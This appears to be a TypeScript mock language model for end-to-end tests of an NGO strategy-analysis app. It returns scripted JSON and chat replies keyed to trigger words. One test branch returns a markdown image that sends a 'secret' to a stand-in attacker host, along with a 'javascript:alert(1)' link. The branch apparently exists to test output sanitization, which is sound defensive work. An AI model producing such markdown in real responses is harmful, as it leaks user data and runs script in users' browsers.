import "server-only";
import { simulateReadableStream } from "ai";
import { MockLanguageModelV4 } from "ai/test";

// A deterministic stand-in model for end-to-end tests (LENS_MOCK_LLM=1).
// It answers from the last user message so tests can drive each UI path.

const marker = (o: object) => "\n<!--lens-state " + JSON.stringify(o) + "-->";

type PromptMessage = { role: string; content: unknown };

function textOf(content: unknown): string {
  if (typeof content === "string") return content;
  if (Array.isArray(content)) return content.map((p) => (p && p.type === "text" ? p.text : "")).join("");
  return "";
}

export function reply(prompt: PromptMessage[]): string {
  const system = prompt.filter((m) => m.role === "system").map((m) => textOf(m.content)).join("\n");
  const last = textOf([...prompt].reverse().find((m) => m.role === "user")?.content);
  const lens = last.match(/perspective of: ([^.]+)\./)?.[1];
  if (/FAIL_PLEASE/.test(last)) throw new Error("Scripted provider failure");
  if (/FRAMEWORKS EXTRACTION/.test(last)) {
    return JSON.stringify({
      organization: "Bright Futures Coding Clubs",
      valueProposition: {
        beneficiary: { who: "Girls aged 12 to 17", jobs: ["Get a first tech skill"], pains: ["No computer at home"], gains: ["A paid internship"] },
        payer: { who: "Two foundations", jobs: ["Show impact to their boards"], pains: ["Unclear outcomes"], gains: ["Countable graduates"] },
        offer: ["Weekly coding clubs", "Mentoring"], painRelievers: ["Laptops at school"], gainCreators: ["Demo day with employers"],
        alternatives: ["Paid private bootcamps"], tension: "Funders count graduates; girls need jobs.",
      },
      strategy: { type: "niche", theoryOfChange: 30, operations: 25, rationale: "One focused intervention.", accountableFor: "Course completion and skills gained." },
      accountability: [
        { stakeholder: "Foundations", direction: "upward", mechanisms: ["Annual reports"], strength: "strong" },
        { stakeholder: "Girls and parents", direction: "downward", mechanisms: [], strength: "absent" },
        { stakeholder: "Volunteer coaches", direction: "internal", mechanisms: ["Monthly check-ins"], strength: "weak" },
      ],
      power: [
        { stakeholder: "Foundations", power: 9, interest: 6, stance: "supportive", note: "Fund 100%" },
        { stakeholder: "School principals", power: 7, interest: 3, stance: "neutral", note: "Control rooms" },
        { stakeholder: "Girls", power: 2, interest: 9, stance: "supportive", note: "Core users" },
      ],
      loops: {
        variables: [{ id: "v1", label: "Girls completing" }, { id: "v2", label: "Funder confidence" }, { id: "v3", label: "Club places" }, { id: "v4", label: "Coach workload" }, { id: "v5", label: "Session quality" }],
        links: [
          { from: "v1", to: "v2", polarity: "+", delay: false }, { from: "v2", to: "v3", polarity: "+", delay: true },
          { from: "v3", to: "v1", polarity: "+", delay: false }, { from: "v3", to: "v4", polarity: "+", delay: false },
          { from: "v4", to: "v5", polarity: "-", delay: false }, { from: "v5", to: "v1", polarity: "+", delay: true },
        ],
        loops: [
          { id: "R1", type: "R", name: "Growth engine", variables: ["v1", "v2", "v3"], story: "Completions attract funding for more places." },
          { id: "B1", type: "B", name: "Coach strain", variables: ["v3", "v4", "v5", "v1"], story: "More places overload coaches and quality falls." },
        ],
        leverage: [
          { level: 12, intervention: "Add more club places", inUse: true },
          { level: 6, intervention: "Share employer hiring data with girls", inUse: false },
        ],
      },
    });
  }
  if (/THEORY OF CHANGE EXTRACTION/.test(last)) {
    const asked = prompt.filter((m) => m.role === "user").map((m) => textOf(m.content)).join(" ");
    if (/GARBLED_PLEASE/.test(asked)) return "Sorry, here is a summary instead.";
    return "```json\n" + JSON.stringify({
      organization: "Bright Futures Coding Clubs",
      problem: "Girls in Benin City have little access to digital skills training.",
      population: "Girls aged 12 to 17 in public secondary schools, Benin City",
      inputs: ["Two foundation grants", "Volunteer coaches", "Donated laptops"],
      activities: ["Weekly after-school coding clubs", "Mentoring by women in tech", "Annual demo day"],
      outputs: ["120 girls complete a 12-week course", "40 projects shown at demo day"],
      shortTermOutcomes: ["Girls gain basic coding skills", "Confidence with computers rises"],
      longTermOutcomes: ["Inferred: More girls choose STEM subjects", "Graduates find tech internships"],
      impact: "Young women in Edo State build careers in the digital economy.",
      assumptions: [
        { text: "Schools give clubs a room and time each week", link: "inputs-activities", evidence: "strong" },
        { text: "Girls keep attending despite household chores", link: "activities-outputs", evidence: "some" },
        { text: "Skills from 12 weeks are enough to change choices", link: "outputs-outcomes", evidence: "none" },
        { text: "Local tech firms hire young women", link: "outcomes-impact", evidence: "none" },
      ],
      gaps: ["No follow-up after girls leave the club", "No baseline of skills"],
      risks: ["Grant renewal in 2027 is uncertain", "Power cuts disrupt sessions"],
    }) + "\n```";
  }
  if (/INJECT_PLEASE/.test(last)) {
    return "Summary ![chart](https://attacker.example/leak?q=secret) and [source](javascript:alert(1)) and [ok](https://example.org)";
  }
  if (/Alignment Report/.test(last)) {
    return "# NGO Strategy and Alignment Report\n\n## Organizational purpose\nScripted purpose.\n\n" +
      Array.from({ length: 30 }, (_, i) => `## Section ${i + 1}\nInputs $\\rightarrow$ outcomes, line ${i + 1}.`).join("\n\n") +
      marker({ stage: "report", current: 0, covered: [1, 2], lens: "" });
  }
  if (lens) {
    return `Speaking as ${lens}. **What decisions do I control here?**` + marker({ stage: "diagnose", current: 3, covered: [2], lens });
  }
  if (/\bdocs?\b/i.test(last)) {
    const names = [...system.matchAll(/^=== (.+) ===$/gm)].map((m) => m[1]);
    return "Documents seen: " + (names.join(", ") || "none") + marker({ stage: "setup", current: 0, covered: [], lens: "" });
  }
  if (/CLOSE_AREA/.test(last)) {
    return "Area verdict: the value proposition holds for girls but demand is unproven. **Next, what is the causal chain?**" +
      marker({ stage: "diagnose", current: 1, covered: [1], lens: "", scores: { 1: { evidence: 2, alignment: 3, note: "Clear need, little proof of demand." } },
        claims: [{ id: "C1", text: "80% of girls complete the course", area: 1, status: "partial", evidence: "Attendance sheets, no follow-up", source: "user" }] });
  }
  return "Promising start. **Who defines the problem: the organization or the community?**" +
    marker({ stage: "diagnose", current: 1, covered: [], lens: "",
      claims: [{ id: "C1", text: "80% of girls complete the course", area: 1, status: "unsupported", evidence: "No data given yet", source: "user" }] });
}

export function scriptedModel() {
  return new MockLanguageModelV4({
    doStream: async ({ prompt }) => {
      const text = reply(prompt as PromptMessage[]);
      const words = text.split(/(?<= )/);
      return {
        stream: simulateReadableStream({
          chunkDelayInMs: 5,
          chunks: [
            { type: "text-start", id: "t" },
            ...words.map((w) => ({ type: "text-delta" as const, id: "t", delta: w })),
            { type: "text-end", id: "t" },
            {
              type: "finish",
              finishReason: { unified: "stop", raw: undefined },
              usage: {
                inputTokens: { total: 1, noCache: 1, cacheRead: undefined, cacheWrite: undefined },
                outputTokens: { total: 1, text: 1, reasoning: undefined },
              },
            },
          ],
        }),
      };
    },
  });
}
